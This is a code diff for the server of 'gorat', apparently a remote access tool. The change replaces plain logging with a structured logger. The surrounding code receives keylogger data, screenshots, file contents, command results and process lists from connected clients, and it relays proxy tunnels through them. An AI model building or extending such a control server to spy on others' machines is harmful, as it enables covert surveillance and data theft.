@@ -6,7 +6,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"log"
 	"net/http"
 	"sync"
 	"time"
@@ -14,6 +13,7 @@ import (
 	"gorat/pkg/api"
 	"gorat/pkg/auth"
 	"gorat/pkg/clients"
+	"gorat/pkg/logger"
 	"gorat/pkg/messaging"
 	"gorat/pkg/protocol"
 	"gorat/pkg/proxy"
@@ -78,8 +78,8 @@ func NewServer(config *Config) *Server {
 	// Initialize client store
 	store, err := storage.NewSQLiteStore("clients.db")
 	if err != nil {
-		log.Printf("ERROR: Failed to create client store: %v", err)
-		log.Println("Server will continue without persistent storage")
+		logger.Get().ErrorWithErr("failed to create client store", err)
+		logger.Get().Warn("server will continue without persistent storage")
 		store = nil // Continue without store
 	}
 
@@ -90,8 +90,8 @@ func NewServer(config *Config) *Server {
 
 	webHandler, err := NewWebHandler(sessionMgr, manager, store, webConfig)
 	if err != nil {
-		log.Printf("ERROR: Failed to create web handler: %v", err)
-		log.Println("Server will continue with limited web functionality")
+		logger.Get().ErrorWithErr("failed to create web handler", err)
+		logger.Get().Warn("server will continue with limited web functionality")
 		webHandler = nil // Explicitly set to nil
 	}
 
@@ -144,14 +144,14 @@ func (s *Server) initializeDispatcher() {
 	s.dispatcher.Register(messaging.NewUpdateStatusHandler())
 	s.dispatcher.Register(messaging.NewTerminalOutputHandler(s.terminalProxy.HandleTerminalOutput))
 	s.dispatcher.Register(messaging.NewPongHandler())
-	log.Println("Message dispatcher initialized with all handlers")
+	logger.Get().Info("message dispatcher initialized with all handlers")
 }
 
 // NewServerWithRecovery creates a new server with error recovery
 func NewServerWithRecovery(config *Config) (*Server, error) {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED during server creation: %v", r)
+			logger.Get().ErrorWith("panic recovered during server creation", "panic", r)
 		}
 	}()
 
@@ -175,8 +175,8 @@ func NewServerWithServices(services *Services) (*Server, error) {
 
 	webHandler, err := NewWebHandler(services.SessionMgr, manager, store, webConfig)
 	if err != nil {
-		log.Printf("WARNING: Failed to create web handler: %v", err)
-		log.Println("Server will continue with API-only functionality")
+		logger.Get().WarnWith("failed to create web handler", "error", err)
+		logger.Get().Warn("server will continue with API-only functionality")
 		webHandler = nil
 	}
 
@@ -220,7 +220,7 @@ func NewServerWithServices(services *Services) (*Server, error) {
 
 // Shutdown gracefully shuts down the server
 func (s *Server) Shutdown(ctx context.Context) error {
-	log.Println("Initiating graceful shutdown...")
+	logger.Get().Info("initiating graceful shutdown")
 
 	s.startedMu.Lock()
 	s.started = false
@@ -232,9 +232,9 @@ func (s *Server) Shutdown(ctx context.Context) error {
 
 	// Shutdown HTTP server if running
 	if httpServer != nil {
-		log.Println("Shutting down HTTP server...")
+		logger.Get().Info("shutting down HTTP server")
 		if err := httpServer.Shutdown(ctx); err != nil {
-			log.Printf("Error shutting down HTTP server: %v", err)
+			logger.Get().ErrorWithErr("error shutting down HTTP server", err)
 			// Force close if graceful shutdown fails
 			httpServer.Close()
 		}
@@ -243,7 +243,7 @@ func (s *Server) Shutdown(ctx context.Context) error {
 	// Close all client connections
 	clients := s.manager.GetAllClients()
 	for _, client := range clients {
-		log.Printf("Closing connection to client: %s", client.ID())
+		logger.Get().InfoWith("closing connection to client", "clientID", client.ID())
 		conn := client.Conn()
 		if conn != nil {
 			conn.Close()
@@ -254,18 +254,18 @@ func (s *Server) Shutdown(ctx context.Context) error {
 	// Close database if available
 	if s.store != nil {
 		if err := s.store.Close(); err != nil {
-			log.Printf("Error closing database: %v", err)
+			logger.Get().ErrorWithErr("error closing database", err)
 		}
 	}
 
-	log.Println("Graceful shutdown complete")
+	logger.Get().Info("graceful shutdown complete")
 	return nil
 } // Start starts the server
 func (s *Server) Start() error {
 	// Prevent duplicate starts
 	s.startedMu.Lock()
 	if s.started {
-		log.Println("Server already started, skipping duplicate start")
+		logger.Get().Warn("server already started, skipping duplicate start")
 		s.startedMu.Unlock()
 		return nil
 	}
@@ -342,14 +342,14 @@ func (s *Server) Start() error {
 	if s.webHandler != nil {
 		s.webHandler.RegisterGinRoutes(router)
 	} else {
-		log.Println("WARNING: WebHandler is nil, skipping web UI routes registration")
+		logger.Get().Warn("webHandler is nil, skipping web UI routes registration")
 		// Register minimal fallback routes
 		router.GET("/", func(c *gin.Context) {
 			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Web UI not available"})
 		})
 	}
 
-	log.Printf("Server starting on %s", s.config.Address)
+	logger.Get().InfoWith("server starting", "address", s.config.Address)
 
 	// Only use TLS if explicitly enabled (default is HTTP for nginx reverse proxy)
 	if s.config.UseTLS && s.config.CertFile != "" && s.config.KeyFile != "" {
@@ -371,7 +371,7 @@ func (s *Server) Start() error {
 		s.httpServer = server
 		s.serverMu.Unlock()
 
-		log.Printf("Using direct TLS")
+		logger.Get().Info("using direct TLS")
 		return server.ListenAndServeTLS(s.config.CertFile, s.config.KeyFile)
 	}
 
@@ -385,7 +385,7 @@ func (s *Server) Start() error {
 	s.httpServer = server
 	s.serverMu.Unlock()
 
-	log.Printf("Using HTTP (TLS should be handled by reverse proxy)")
+	logger.Get().Info("using HTTP (TLS should be handled by reverse proxy)")
 	return server.ListenAndServe()
 }
 
@@ -525,7 +525,7 @@ func getClientIP(r *http.Request) string {
 func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		log.Printf("WebSocket upgrade error: %v", err)
+		logger.Get().ErrorWithErr("websocket upgrade error", err)
 		return
 	}
 
@@ -533,13 +533,13 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	var authMsg protocol.Message
 	err = conn.ReadJSON(&authMsg)
 	if err != nil {
-		log.Printf("Failed to read auth message: %v", err)
+		logger.Get().ErrorWithErr("failed to read auth message", err)
 		conn.Close()
 		return
 	}
 
 	if authMsg.Type != protocol.MsgTypeAuth {
-		log.Printf("Expected auth message, got: %s", authMsg.Type)
+		logger.Get().WarnWith("expected auth message, got different type", "messageType", authMsg.Type)
 		conn.Close()
 		return
 	}
@@ -547,7 +547,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	var authPayload protocol.AuthPayload
 	err = authMsg.ParsePayload(&authPayload)
 	if err != nil {
-		log.Printf("Failed to parse auth payload: %v", err)
+		logger.Get().ErrorWithErr("failed to parse auth payload", err)
 		conn.Close()
 		return
 	}
@@ -602,7 +602,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	// Register client with the manager
 	client, err := s.manager.RegisterClient(authPayload.ClientID, conn)
 	if err != nil {
-		log.Printf("Failed to register client: %v", err)
+		logger.Get().ErrorWithErr("failed to register client", err)
 		conn.Close()
 		return
 	}
@@ -638,7 +638,7 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 func (s *Server) readPump(client clients.Client) {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in readPump for client %s: %v", client.ID(), r)
+			logger.Get().ErrorWith("panic recovered in readPump", "clientID", client.ID(), "panic", r)
 		}
 		s.manager.UnregisterClient(client.ID())
 		conn := client.Conn()
@@ -664,7 +664,7 @@ func (s *Server) readPump(client clients.Client) {
 		err := conn.ReadJSON(&rawMsg)
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-				log.Printf("WebSocket error: %v", err)
+				logger.Get().ErrorWithErr("websocket error", err)
 			}
 			break
 		}
@@ -689,7 +689,7 @@ func (s *Server) readPump(client clients.Client) {
 						// Decode from base64
 						decodedData, err := base64.StdEncoding.DecodeString(dataStr)
 						if err != nil {
-							log.Printf("Error decoding base64 proxy data: %v", err)
+							logger.Get().ErrorWithErr("error decoding base64 proxy data", err)
 							data = []byte(dataStr) // Fallback to raw string if not valid base64
 						} else {
 							data = decodedData
@@ -699,7 +699,7 @@ func (s *Server) readPump(client clients.Client) {
 
 				if s.proxyManager != nil && proxyID != "" && userID != "" {
 					if err := s.proxyManager.HandleProxyDataFromClient(proxyID, userID, data); err != nil {
-						log.Printf("Error handling proxy data: %v", err)
+						logger.Get().ErrorWithErr("error handling proxy data", err)
 					}
 				}
 				continue
@@ -711,7 +711,7 @@ func (s *Server) readPump(client clients.Client) {
 
 				if s.proxyManager != nil && proxyID != "" && userID != "" {
 					if err := s.proxyManager.HandleProxyDisconnect(proxyID, userID); err != nil {
-						log.Printf("Error handling proxy disconnect: %v", err)
+						logger.Get().ErrorWithErr("error handling proxy disconnect", err)
 					}
 				}
 				continue
@@ -722,7 +722,7 @@ func (s *Server) readPump(client clients.Client) {
 		jsonData, _ := json.Marshal(rawMsg)
 		var msg protocol.Message
 		if err := json.Unmarshal(jsonData, &msg); err != nil {
-			log.Printf("Failed to parse message from %s: %v", client.ID(), err)
+			logger.Get().ErrorWithErr("failed to parse message from client", err, "clientID", client.ID())
 			continue
 		}
 		// Handle message
@@ -767,7 +767,7 @@ func (s *Server) writePump(client clients.Client) {
 func (s *Server) handleMessage(client clients.Client, msg *protocol.Message) {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID(), r)
+			logger.Get().ErrorWith("panic recovered in handleMessage", "clientID", client.ID(), "panic", r)
 		}
 	}()
 
@@ -784,86 +784,86 @@ func (s *Server) handleMessage(client clients.Client, msg *protocol.Message) {
 	case protocol.MsgTypeCommandResult:
 		var cr protocol.CommandResultPayload
 		if err := msg.ParsePayload(&cr); err == nil {
-			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID(), cr.Success, cr.ExitCode)
+			logger.Get().DebugWith("command result received", "clientID", client.ID(), "success", cr.Success, "exitCode", cr.ExitCode)
 			s.resultsMu.Lock()
 			s.commandResults[client.ID()] = &cr
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Command result from %s: %s", client.ID(), string(msg.Payload))
+			logger.Get().DebugWith("command result received (raw)", "clientID", client.ID(), "payload", string(msg.Payload))
 		}
 
 	case protocol.MsgTypeFileList:
 		var fl protocol.FileListPayload
 		if err := msg.ParsePayload(&fl); err == nil {
-			log.Printf("File list from %s: %d files", client.ID(), len(fl.Files))
+			logger.Get().DebugWith("file list received", "clientID", client.ID(), "fileCount", len(fl.Files))
 			s.resultsMu.Lock()
 			s.fileListResults[client.ID()] = &fl
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("File list from %s", client.ID())
+			logger.Get().DebugWith("file list received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeDriveList:
 		var dl protocol.DriveListPayload
 		if err := msg.ParsePayload(&dl); err == nil {
-			log.Printf("Drive list from %s: %d drives", client.ID(), len(dl.Drives))
+			logger.Get().DebugWith("drive list received", "clientID", client.ID(), "driveCount", len(dl.Drives))
 			s.resultsMu.Lock()
 			s.driveListResults[client.ID()] = &dl
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Drive list from %s", client.ID())
+			logger.Get().DebugWith("drive list received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeProcessList:
 		var pl protocol.ProcessListPayload
 		if err := msg.ParsePayload(&pl); err == nil {
-			log.Printf("Process list from %s: %d processes", client.ID(), len(pl.Processes))
+			logger.Get().DebugWith("process list received", "clientID", client.ID(), "processCount", len(pl.Processes))
 			s.SetProcessListResult(client.ID(), &pl)
 		} else {
-			log.Printf("Process list from %s", client.ID())
+			logger.Get().DebugWith("process list received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeSystemInfo:
 		var si protocol.SystemInfoPayload
 		if err := msg.ParsePayload(&si); err == nil {
-			log.Printf("System info from %s: %s (%s %s)", client.ID(), si.Hostname, si.OS, si.Arch)
+			logger.Get().DebugWith("system info received", "clientID", client.ID(), "hostname", si.Hostname, "os", si.OS, "arch", si.Arch)
 			s.SetSystemInfoResult(client.ID(), &si)
 		} else {
-			log.Printf("System info from %s", client.ID())
+			logger.Get().DebugWith("system info received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeFileData:
 		var fd protocol.FileDataPayload
 		if err := msg.ParsePayload(&fd); err == nil {
-			log.Printf("File data from %s: %s (%d bytes)", client.ID(), fd.Path, len(fd.Data))
+			logger.Get().DebugWith("file data received", "clientID", client.ID(), "path", fd.Path, "size", len(fd.Data))
 			s.resultsMu.Lock()
 			s.fileDataResults[client.ID()] = &fd
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("File data from %s", client.ID())
+			logger.Get().DebugWith("file data received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeScreenshotData:
 		var sd protocol.ScreenshotDataPayload
 		if err := msg.ParsePayload(&sd); err == nil {
-			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID(), sd.Width, sd.Height, len(sd.Data))
+			logger.Get().DebugWith("screenshot received", "clientID", client.ID(), "width", sd.Width, "height", sd.Height, "size", len(sd.Data))
 			s.resultsMu.Lock()
 			s.screenshotResults[client.ID()] = &sd
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Screenshot received from %s", client.ID())
+			logger.Get().DebugWith("screenshot received (parse error)", "clientID", client.ID())
 		}
 
 	case protocol.MsgTypeKeyloggerData:
 		var kld protocol.KeyloggerDataPayload
 		if err := msg.ParsePayload(&kld); err == nil {
-			log.Printf("Keylogger data from %s: %s", client.ID(), kld.Keys)
+			logger.Get().DebugWith("keylogger data received", "clientID", client.ID(), "keys", kld.Keys)
 		}
 
 	case protocol.MsgTypeUpdateStatus:
 		var us protocol.UpdateStatusPayload
 		if err := msg.ParsePayload(&us); err == nil {
-			log.Printf("Update status from %s: %s - %s", client.ID(), us.Status, us.Message)
+			logger.Get().InfoWith("update status received", "clientID", client.ID(), "status", us.Status, "message", us.Message)
 		}
 
 	case protocol.MsgTypeTerminalOutput:
@@ -876,7 +876,7 @@ func (s *Server) handleMessage(client clients.Client, msg *protocol.Message) {
 		// Heartbeat response
 
 	default:
-		log.Printf("Unknown message type from %s: %s", client.ID(), msg.Type)
+		logger.Get().WarnWith("unknown message type received", "clientID", client.ID(), "messageType", msg.Type)
 	}
 }
 
@@ -1110,8 +1110,8 @@ func (s *Server) clearCachedClientData(clientID string) {
 func (s *Server) monitorClientStatus() {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in monitorClientStatus: %v", r)
-			log.Println("Restarting client status monitor...")
+			logger.Get().ErrorWith("panic recovered in monitorClientStatus", "panic", r)
+			logger.Get().Info("restarting client status monitor")
 			time.Sleep(5 * time.Second)
 			go s.monitorClientStatus() // Restart the monitor
 		}
@@ -1127,7 +1127,7 @@ func (s *Server) monitorClientStatus() {
 			metadata := client.Metadata()
 			if metadata != nil && s.store != nil {
 				if err := s.store.SaveClient(metadata); err != nil {
-					log.Printf("Error saving client %s: %v", client.ID(), err)
+					logger.Get().ErrorWithErr("error saving client", err, "clientID", client.ID())
 				}
 			}
 		}
@@ -1135,7 +1135,7 @@ func (s *Server) monitorClientStatus() {
 		// Mark clients as offline if not seen recently (2 minutes)
 		if s.store != nil {
 			if err := s.store.MarkOffline(2 * time.Minute); err != nil {
-				log.Printf("Error marking offline clients: %v", err)
+				logger.Get().ErrorWithErr("error marking offline clients", err)
 			}
 		}
 	}
@@ -1145,26 +1145,26 @@ func (s *Server) monitorClientStatus() {
 func (s *Server) loadSavedClients() {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in loadSavedClients: %v", r)
+			logger.Get().ErrorWith("panic recovered in loadSavedClients", "panic", r)
 		}
 	}()
 
 	if s.store == nil {
-		log.Println("Client store not available, skipping load from database")
+		logger.Get().Info("client store not available, skipping load from database")
 		return
 	}
 
-	log.Println("Loading saved clients from database...")
+	logger.Get().Info("loading saved clients from database")
 	clients, err := s.store.GetAllClients()
 	if err != nil {
-		log.Printf("Error loading saved clients: %v", err)
+		logger.Get().ErrorWithErr("error loading saved clients", err)
 		return
 	}
 
-	log.Printf("Loaded %d clients from database", len(clients))
+	logger.Get().InfoWith("loaded clients from database", "count", len(clients))
 	for _, client := range clients {
-		log.Printf("  - %s (%s) - %s - Last seen: %s",
-			client.ID, client.Hostname, client.Status, client.LastSeen.Format(time.RFC3339))
+		logger.Get().DebugWith("loaded client",
+			"id", client.ID, "hostname", client.Hostname, "status", client.Status, "lastSeen", client.LastSeen.Format(time.RFC3339))
 	}
 }
 
@@ -1172,16 +1172,16 @@ func (s *Server) loadSavedClients() {
 func (s *Server) loadSavedProxies() {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in loadSavedProxies: %v", r)
+			logger.Get().ErrorWith("panic recovered in loadSavedProxies", "panic", r)
 		}
 	}()
 
 	if s.store == nil {
-		log.Println("Store not available, skipping proxy load from database")
+		logger.Get().Info("store not available, skipping proxy load from database")
 		return
 	}
 
-	log.Println("Loading saved proxies from database...")
+	logger.Get().Info("loading saved proxies from database")
 
 	// Initialize proxy manager if not already done
 	if s.proxyManager == nil {
@@ -1190,16 +1190,16 @@ func (s *Server) loadSavedProxies() {
 
 	proxies, err := s.store.GetAllProxies()
 	if err != nil {
-		log.Printf("Error loading saved proxies: %v", err)
+		logger.Get().ErrorWithErr("error loading saved proxies", err)
 		return
 	}
 
 	if len(proxies) == 0 {
-		log.Println("No saved proxies found in database")
+		logger.Get().Info("no saved proxies found in database")
 		return
 	}
 
-	log.Printf("Found %d saved proxies in database, attempting to restore...", len(proxies))
+	logger.Get().InfoWith("found saved proxies in database, attempting to restore", "count", len(proxies))
 
 	successCount := 0
 	failCount := 0
@@ -1208,13 +1208,13 @@ func (s *Server) loadSavedProxies() {
 		// Check if client is available
 		client, exists := s.manager.GetClient(proxy.ClientID)
 		if !exists {
-			log.Printf("  ⚠️  Skipping proxy %s (client %s not currently connected)", proxy.ID, proxy.ClientID)
+			logger.Get().WarnWith("skipping proxy - client not connected", "proxyID", proxy.ID, "clientID", proxy.ClientID)
 			failCount++
 			continue
 		}
 
 		if client.Conn() == nil {
-			log.Printf("  ⚠️  Skipping proxy %s (client %s WebSocket not ready)", proxy.ID, proxy.ClientID)
+			logger.Get().WarnWith("skipping proxy - websocket not ready", "proxyID", proxy.ID, "clientID", proxy.ClientID)
 			failCount++
 			continue
 		}
@@ -1229,18 +1229,18 @@ func (s *Server) loadSavedProxies() {
 		)
 
 		if err != nil {
-			log.Printf("  ❌ Failed to restore proxy %s: %v", proxy.ID, err)
+			logger.Get().WarnWith("failed to restore proxy", "proxyID", proxy.ID, "error", err)
 			failCount++
 			continue
 		}
 
-		log.Printf("  ✅ Restored proxy: :%d -> %s:%d (client: %s, protocol: %s)",
-			conn.LocalPort, conn.RemoteHost, conn.RemotePort, conn.ClientID, conn.Protocol)
+		logger.Get().InfoWith("restored proxy",
+			"localPort", conn.LocalPort, "remoteHost", conn.RemoteHost, "remotePort", conn.RemotePort, "clientID", conn.ClientID, "protocol", conn.Protocol)
 		successCount++
 	}
 
-	log.Printf("Proxy restore complete: %d restored, %d skipped/failed", successCount, failCount)
-	log.Printf("Note: Proxies will be auto-restored when their clients reconnect")
+	logger.Get().InfoWith("proxy restore complete", "restored", successCount, "failed", failCount)
+	logger.Get().Info("note: proxies will be auto-restored when their clients reconnect")
 }
 
 // UpdateClientMetadata implements messaging.ClientMetadataUpdater
